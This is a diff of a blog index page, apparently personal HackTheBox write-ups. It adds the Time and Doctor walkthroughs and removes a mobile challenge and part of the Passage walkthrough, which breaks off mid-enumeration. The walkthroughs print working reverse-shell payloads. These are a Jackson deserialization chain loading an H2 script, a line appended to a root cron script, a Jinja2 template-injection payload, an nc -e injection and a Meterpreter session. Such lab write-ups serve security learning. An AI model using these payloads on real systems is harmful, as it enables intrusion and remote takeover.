@@ -101,6 +101,204 @@
 	   
 	<div class="article-header">
 	    
+		<a class="title" href="/2020/11/07/HTB-Time/">HTB Time Writeup</a>  
+	       
+		 
+
+		<div class="meta">
+			<time>Nov 07, 2020</time>			
+		</div>
+	</div>
+
+
+	
+		<div class="thumb">
+			<div class="banner lazyload" data-origin="/images/HTB-Time/image-20201107200513767.png" data-src="/images/HTB-Time/image-20201107200513767.png" style="background-image: url(&quot;/images/placeholder.png&quot;);"></div>
+		</div>
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/HTB-Time/image-20201107200513767.png" alt="image-20201107200513767"></p>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 20:06 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.214</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Online JSON parser</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.06 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Start to enumerate at the <em>http</em> port</p>
+<p>Not able to find other directory other than the index page</p>
+<p><img src="/images/HTB-Time/image-20201107200901834.png" alt="image-20201107200901834"></p>
+<p>Guess this is the only route to <em>user</em></p>
+<p>Tried different input</p>
+<p><img src="/images/HTB-Time/image-20201107201052773.png" alt="image-20201107201052773"></p>
+<figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">Validation failed: Unhandled Java exception: com<span class="selector-class">.fasterxml</span><span class="selector-class">.jackson</span><span class="selector-class">.core</span><span class="selector-class">.JsonParseException</span>: Unrecognized token <span class="string">'test'</span>: was expecting <span class="string">'null'</span>, <span class="string">'true'</span>, <span class="string">'false'</span> or NaN</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Found some error message.</p>
+<p>After googling, with the keyword <em>fasterxml and jackson</em></p>
+<p>we found this <a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-12384">CVE</a></p>
+<p>Create a <em>inject.sql</em> with bash reverse shell</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException {</span><br><span class="line">        String[] command <span class="operator">=</span> {"bash", "-c", cmd};</span><br><span class="line">        java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(command).getInputStream()).useDelimiter("\\A");</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : "";  }</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">'bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1'</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Start a python server</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Also start a listner</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Finally our payload</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>,{<span class="string">"url"</span>:<span class="string">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://x.x.x.x/inject.sql'"</span>}]</span><br></pre></td></tr></tbody></table></figure>
+
+<p>​	And we got our reverse shell back</p>
+<p><img src="/images/placeholder.png" alt="image-20201107204418416" data-src="/images/HTB-Time/image-20201107204418416.png" class="lazyload"></p>
+<h1 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h1><p>After some enumeration manage to find something interesting using <strong>PSPY64</strong></p>
+<p><img src="/images/placeholder.png" alt="image-20201107194832954" data-src="/images/HTB-Time/image-20201107194832954.png" class="lazyload"></p>
+<p> <strong>/usr/bin/timer_backup.sh</strong> is run by Root</p>
+<p><code>-rwxrw-rw- 1 pericles pericles 88 Nov  7 12:50 /usr/bin/timer_backup.sh</code></p>
+<p>We have write permission.</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"bash -i &gt;&amp; /dev/tcp/10.10.14.22/5555 0&gt;&amp;1"</span> &gt;&gt; /usr/bin/timer_backup.sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>and we get a easy root. But the nc will exit somehow less than 30second, another method is to write your public key and enter in SSH</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.10.214] 33944</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (230926): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@time:/<span class="comment"># whoami &amp;&amp; id &amp;&amp; hostname</span></span><br><span class="line"><span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span> &amp;&amp; hostname</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">time</span><br><span class="line">root@time:/<span class="comment"># exit</span></span><br></pre></td></tr></tbody></table></figure>
+
+<br>
+<br>
+<br>
+
+<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/medium/">medium</a>           
+			
+		
+	</div>
+
+	<div class="article-bottom">
+		<a class="readmore" href="/2020/11/07/HTB-Time/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a class="title" href="/2020/10/06/HTB-Doctor/">HTB Doctor Writeup</a>  
+	       
+		 
+
+		<div class="meta">
+			<time>Oct 06, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/placeholder.png" alt="image-20201009214428794" data-src="/images/HTB-Doctor/image-20201009214428794.png" class="lazyload"></p>
+<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author Ikonw"></a>Author Ikonw</h2><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun Sep 27 09:39:47 2020 as: nmap -Pn -sCV -p22,80,8089 -oN nmap/Full_10.129.11.0.nmap 10.129.11.0</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> doctor.htb (10.129.11.0)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089/tcp open  ssl/http Splunkd httpd</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Splunkd</span><br><span class="line">|_http-title: splunkd</span><br><span class="line">| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">|_Not valid after:  2023-09-06T15:57:27</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Start enumeration on port 80, found the <code>info@doctors.htb</code> email.</p>
+<p>Let’s add the hostname <code>doctors.htb</code> to <code>/etc/hosts</code></p>
+<p><img src="/images/placeholder.png" alt="image-20201009214518677" data-src="/images/HTB-Doctor/image-20201009214518677.png" class="lazyload"></p>
+<p>After adding to host file, visit <code>doctors.htb</code> come to a login page</p>
+<p><img src="/images/placeholder.png" alt="image-20201009214618490" data-src="/images/HTB-Doctor/image-20201009214618490.png" class="lazyload"></p>
+<p>Tried to use <code>info@doctors.htb</code> to login, with the reset password function, we can verify that <code>info@doctors.htb</code> is not a valid account.</p>
+<p><img src="/images/placeholder.png" alt="image-20201009214740397" data-src="/images/HTB-Doctor/image-20201009214740397.png" class="lazyload"></p>
+<p>Once we register, there’s only one function. </p>
+<p><img src="/images/placeholder.png" alt="image-20201009214919652" data-src="/images/HTB-Doctor/image-20201009214919652.png" class="lazyload"></p>
+<p>From the page source, we found <code>/archive</code> but it appears to be blank page </p>
+<p><img src="/images/placeholder.png" alt="image-20201009214950290" data-src="/images/HTB-Doctor/image-20201009214950290.png" class="lazyload"></p>
+<p>The <code>New Post</code> is vulnerable to <code>server site template injection</code></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Server Side Template Injection Payloads</a></p>
+<p><img src="/images/placeholder.png" alt="image-20201009220337033" data-src="/images/HTB-Doctor/image-20201009220337033.png" class="lazyload"></p>
+<p>When we input <code>{{7*7}}</code> , we notice that it is shown on the <code>/archive</code> page.</p>
+<p>can confirmed that it is using either <code>Twig</code> or <code>Jinja2</code></p>
+<p>Next up, craft a malicious payload to obtain reverse connecction</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{% <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() %}{% <span class="keyword">if</span> <span class="string">"warning"</span> <span class="keyword">in</span> x.__name__ %}{{x()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.67\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'"</span>).read()}}{%endif%}{%endfor%}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Another way would be using malicious curl command, this seems the unintended way</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">&lt;img src=http://10.10.14.67:1337/$(nc.traditional<span class="variable">$IFS</span>-e<span class="variable">$IFS</span>/bin/bash<span class="variable">$IFS</span><span class="string">'10.10.14.67'</span><span class="variable">$IFS</span><span class="string">'4444'</span>)&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" alt="image-20201010132416445" data-src="/images/HTB-Doctor/image-20201010132416445.png" class="lazyload"></p>
+<h1 id="WWW-data-to-User"><a href="#WWW-data-to-User" class="headerlink" title="WWW-data to User"></a>WWW-data to User</h1><p>Went to <code>/home</code> directory we found user <code>shaun</code></p>
+<p>Found user password in <code>/var/log/apache/backup</code></p>
+<p>And we can switch to user <code>shaun</code>.</p>
+<p>Using the privilege escalation suggester we got the splunk is vulnerable. </p>
+<p>By using the <a target="_blank" rel="noopener" href="https://github.com/cnotin/SplunkWhisperer2">https://github.com/cnotin/SplunkWhisperer2</a> we are able to get privileges’ to root </p>
+<p>Initial foothold is more annoying, from www-data to user to root is easy</p>
+<br>
+<br>
+<br>
+
+<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/easy/">easy</a>           
+			
+		
+	</div>
+
+	<div class="article-bottom">
+		<a class="readmore" href="/2020/10/06/HTB-Doctor/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
 		<a class="title" href="/2020/09/25/PHP-audit-lab%20day3/">PHP::in_array() Type Juggling</a>  
 	       
 		 
@@ -423,14 +621,14 @@
     
 	<div class="typo article-excerpt">	
 		 
-			<p><img src="/images/HTB-Compromised-Hard/image-20200917153421555.png" alt="image-20200917153421555"></p>
+			<p><img src="/images/placeholder.png" alt="image-20200917153421555" data-src="/images/HTB-Compromised-Hard/image-20200917153421555.png" class="lazyload"></p>
 <h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan:"></a>Nmap Scan:</h3><figure class="highlight livecodeserver"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Thu Sep 17 12:32:35 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.10.10.207.nmap 10.10.10.207</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.207</span></span><br><span class="line">Host is up (<span class="number">0.13</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span>ubuntu0<span class="number">.3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">6</span>e:da:<span class="number">5</span>c:<span class="number">8</span>e:<span class="number">8</span>e:fb:<span class="number">8</span>e:<span class="number">75</span>:<span class="number">27</span>:<span class="number">4</span><span class="keyword">a</span>:b9:<span class="number">2</span><span class="keyword">a</span>:<span class="number">59</span>:cd:<span class="number">4</span>b:cb (RSA)</span><br><span class="line">|   <span class="number">256</span> d5:c5:b3:<span class="number">0</span>d:c8:b6:<span class="number">69</span>:e4:fb:<span class="number">13</span>:a3:<span class="number">81</span>:<span class="number">4</span><span class="keyword">a</span>:<span class="number">15</span>:<span class="number">16</span>:d2 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">35</span>:<span class="number">6</span><span class="keyword">a</span>:ee:af:dc:f8:<span class="number">5</span>e:<span class="number">67</span>:<span class="number">0</span>d:bb:f3:ab:<span class="number">18</span>:<span class="number">64</span>:<span class="number">47</span>:<span class="number">90</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span>    Apache httpd <span class="number">2.4</span><span class="number">.29</span> ((Ubuntu))</span><br><span class="line">|<span class="title">_http-server-header</span>: Apache/<span class="number">2.4</span><span class="number">.29</span> (Ubuntu)</span><br><span class="line">| <span class="keyword">http</span>-title: Legitimate Rubber Ducks | Online Store</span><br><span class="line">|_Requested resource was <span class="keyword">http</span>://<span class="number">10.10</span><span class="number">.10</span><span class="number">.207</span>/shop/en/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report <span class="keyword">any</span> incorrect results <span class="keyword">at</span> <span class="keyword">https</span>://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Thu Sep 17 12:32:47 2020 -- 1 IP address (1 host up) scanned in 12.01 seconds</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 
 <p>Port 80 webserver was a online store</p>
 <p>As usual, launch gobuster enumerate potential directories</p>
-<p><img src="/images/HTB-Compromised-Hard/image-20200917153449369.png" alt="image-20200917153449369"></p>
+<p><img src="/images/placeholder.png" alt="image-20200917153449369" data-src="/images/HTB-Compromised-Hard/image-20200917153449369.png" class="lazyload"></p>
 <p>Found a backup directory, I believe it’s the source code for the web</p>
-<p><img src="/images/HTB-Compromised-Hard/image-20200917153509156.png" alt="image-20200917153509156"></p>
+<p><img src="/images/placeholder.png" alt="image-20200917153509156" data-src="/images/HTB-Compromised-Hard/image-20200917153509156.png" class="lazyload"></p>
 <p>search for the keyword <code>username</code> to look for potential plaintext username or hard coded password </p>
 <figure class="highlight gradle"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">grep</span> -R <span class="string">'username|password'</span> |<span class="keyword">grep</span> -v <span class="string">'jquery'</span></span><br></pre></td></tr></tbody></table></figure>
 
@@ -533,222 +731,6 @@
 
 	
 	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
-		<a class="title" href="/2020/09/11/Challenge-Cat/">HTB::Challenge [Mobile] Cat</a>  
-	       
-		 
-
-		<div class="meta">
-			<time>Sep 11, 2020</time>			
-		</div>
-	</div>
-
-
-	
-
-    
-	<div class="typo article-excerpt">	
-		 
-			<p><img src="/images/placeholder.png" alt="image-20200911134041620" data-src="/images/Challenge-Cat/image-20200911134041620.png" class="lazyload"></p>
-<p>After extracting the file from zip, we got a <code>Andriod Backup </code> </p>
-<p>Upon google, we found a way to extract the file</p>
-<p><code>( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 backup.ab ) |  tar xfvz -</code></p>
-<p>and we got 2 folders <code>apps</code> and <code>shared</code></p>
-<p>and we found this picture, the flag is at the bottom of the paper</p>
-<p><img src="/images/placeholder.png" alt="image-20200911134438299" data-src="/images/Challenge-Cat/image-20200911134438299.png" class="lazyload"></p>
-<p>HTB{ThisBackupIsUnprotected}</p>
-
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/hackthebox-challenge/">hackthebox-challenge</a>           
-		            
-				<a class="link" href="/categories/hackthebox-challenge/mobile/">mobile</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
-			
-		
-	</div>
-
-	<div class="article-bottom">
-		<a class="readmore" href="/2020/09/11/Challenge-Cat/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
-		<a class="title" href="/2020/09/06/HTB-Passage/">HTB Passage Writeup</a>  
-	       
-		 
-
-		<div class="meta">
-			<time>Sep 06, 2020</time>			
-		</div>
-	</div>
-
-
-	
-
-    
-	<div class="typo article-excerpt">	
-		 
-			<p><img src="/images/placeholder.png" alt="image-20200906132505581" data-src="/images/HTB-Passage-Medium/image-20200906132505581.png" class="lazyload"></p>
-<h2 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h2><figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun Sep  6 12:17:03 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.129.5.22.nmap 10.129.5.22</span></span><br><span class="line"><span class="title class_">Nmap</span> scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">5.22</span></span><br><span class="line"><span class="title class_">Host</span> is up (<span class="number">0.26</span>s latency).</span><br><span class="line"></span><br><span class="line"><span class="title class_">PORT</span>   <span class="title class_">STATE</span> <span class="title class_">SERVICE</span> <span class="title class_">VERSION</span></span><br><span class="line"><span class="number">22</span>/tcp open  ssh     <span class="title class_">OpenSSH</span> <span class="number">7.2</span>p2 <span class="title class_">Ubuntu</span> <span class="number">4</span> (<span class="title class_">Ubuntu</span> <span class="title class_">Linux</span>; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-<span class="symbol">hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">17</span><span class="symbol">:eb</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">e:</span><span class="number">23</span><span class="symbol">:ea</span><span class="symbol">:</span><span class="number">23</span><span class="symbol">:b6</span><span class="symbol">:b1</span><span class="symbol">:bc</span><span class="symbol">:c6</span><span class="symbol">:</span><span class="number">4</span><span class="symbol">f:</span><span class="symbol">db:</span><span class="number">98</span><span class="symbol">:d3</span><span class="symbol">:d4</span><span class="symbol">:a1</span> (<span class="title class_">RSA</span>)</span><br><span class="line">|   <span class="number">256</span> <span class="number">71</span><span class="symbol">:</span><span class="number">64</span><span class="symbol">:</span><span class="number">51</span><span class="symbol">:</span><span class="number">50</span><span class="symbol">:c3</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">f:</span><span class="number">18</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:</span><span class="number">03</span><span class="symbol">:</span><span class="number">98</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">e:</span><span class="number">5</span><span class="symbol">e:</span><span class="symbol">b8:</span><span class="number">10</span><span class="symbol">:</span><span class="number">19</span><span class="symbol">:fc</span> (<span class="title class_">ECDSA</span>)</span><br><span class="line">|_  <span class="number">256</span> <span class="symbol">fd:</span><span class="number">56</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">a:</span><span class="symbol">f8:</span><span class="symbol">d0:</span><span class="number">60</span><span class="symbol">:a7</span><span class="symbol">:f1</span><span class="symbol">:a0</span><span class="symbol">:a1</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:a4</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:d6</span><span class="symbol">:a8</span><span class="symbol">:a1</span> (<span class="title class_">ED25519</span>)</span><br><span class="line"><span class="number">80</span>/tcp open  http    <span class="title class_">Apache</span> httpd <span class="number">2.4</span>.<span class="number">18</span> ((<span class="title class_">Ubuntu</span>))</span><br><span class="line">|_http-server-<span class="symbol">header:</span> <span class="title class_">Apache</span>/<span class="number">2.4</span>.<span class="number">18</span> (<span class="title class_">Ubuntu</span>)</span><br><span class="line">|_http-<span class="symbol">title:</span> <span class="title class_">Passage</span> <span class="title class_">News</span></span><br><span class="line"><span class="title class_">Service</span> <span class="symbol">Info:</span> <span class="symbol">OS:</span> <span class="title class_">Linux</span>; <span class="symbol">CPE:</span> <span class="symbol">cpe:</span>/<span class="symbol">o:</span><span class="symbol">linux:</span>linux_kernel</span><br><span class="line"></span><br><span class="line"><span class="title class_">Service</span> detection performed. <span class="title class_">Please</span> report any incorrect results at <span class="symbol">https:</span>//nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun Sep  6 12:17:20 2020 -- 1 IP address (1 host up) scanned in 16.72 seconds</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<p>We found the site has implement fail2ban, which it will block certain IP address if it touches the threshold, gobuster might not work here.</p>
-<p><img src="/images/placeholder.png" alt="image-20200906132744866" data-src="/images/HTB-Passage-Medium/image-20200906132744866.png" class="lazyload"></p>
-<p><strong><a target="_blank" rel="noopener" href="http://www.passage.htb/cutenews">http://www.passage.htb/cutenews</a></strong></p>
-<p>Version CuteVews 2.1.2 , rating more towards CVE</p>
-<p><img src="/images/placeholder.png" alt="image-20200906132844233" data-src="/images/HTB-Passage-Medium/image-20200906132844233.png" class="lazyload"></p>
-<p><img src="/images/placeholder.png" alt="image-20200906132903154" data-src="/images/HTB-Passage-Medium/image-20200906132903154.png" class="lazyload"></p>
-<p>Use searchsploit</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/nmapAutomator/10.129.5.22/nmap]</span><br><span class="line">└─<span class="comment"># searchsploit cutenews | grep 2.1.2</span></span><br><span class="line">CuteNews 2.1.2 - <span class="string">'avatar'</span> Remote Code Execution (Metasploit)                                | php/remote/46698.rb</span><br><span class="line">CuteNews 2.1.2 - Arbitrary File Deletion                                                    | php/webapps/48447.txt</span><br><span class="line">CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                        | php/webapps/48458.txt</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-<p>Found Metasploit module, msfconsole was not able to search the module, therefore we have to add it manually.</p>
-<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">cp <span class="number">46698</span>.rb <span class="regexp">/usr/</span>share<span class="regexp">/metasploit-framework/m</span>odules<span class="regexp">/exploits/</span>linux<span class="regexp">/http/</span><span class="number">46698</span>.rb</span><br></pre></td></tr></tbody></table></figure>
-
-<p>and we will have error saying out file unable to load. Because there’s some error in this ruby file (Why offsec would keep bad module ?)</p>
-<figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">'References'</span> =&gt;</span><br><span class="line">    [</span><br><span class="line">      [<span class="string">'URL'</span>, <span class="string">'http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html'</span>],   <span class="regexp">//</span> &lt;---- <span class="title class_">Add</span> a comma here to fix</span><br><span class="line">      [<span class="string">'URL'</span>, <span class="string">'http://cutephp.com'</span>] <span class="comment"># Official Website</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-<p>First, we have to register a account</p>
-<p><img src="/images/placeholder.png" alt="image-20200906134157017" data-src="/images/HTB-Passage-Medium/image-20200906134157017.png" class="lazyload"></p>
-<p><img src="/images/placeholder.png" alt="image-20200906134206315" data-src="/images/HTB-Passage-Medium/image-20200906134206315.png" class="lazyload"></p>
-<p>Next, open up msfconsole, load the module we just added</p>
-<figure class="highlight ebnf"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">reload_all</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>And this is our options </p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">msf5 exploit(linux/http/46698) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/46698):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD   ikonw            no        Password to authenticate with</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     10.129.5.22      <span class="built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /CuteNews        <span class="built_in">yes</span>       Base CutePHP directory path</span><br><span class="line">   USERNAME   ikonw            <span class="built_in">yes</span>       Username to authenticate with</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.14.6       <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   </span><br><span class="line">msf5 exploit(linux/http/46698) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.6:4444 </span><br><span class="line">[*] http://10.129.5.22:80 - CuteNews is 2.1.2</span><br><span class="line">[+] Authentication was successful with user: ikonw</span><br><span class="line">[*] Trying to upload ouriwixb.php</span><br><span class="line">[+] Upload successfully.</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.129.5.22</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.6:4444 -&gt; 10.129.5.22:37850) at 2020-09-06 13:02:44 +0800</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-<p>and we got the www-data user.</p>
-<p>We found 2 user</p>
-<p><strong>nadav</strong> and <strong>paul</strong></p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">www-data@passage:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">nadav  paul</span><br></pre></td></tr></tbody></table></figure>
-
-<p>Went back to web directory for more enumeration, try to see if any config file stores the users cred</p>
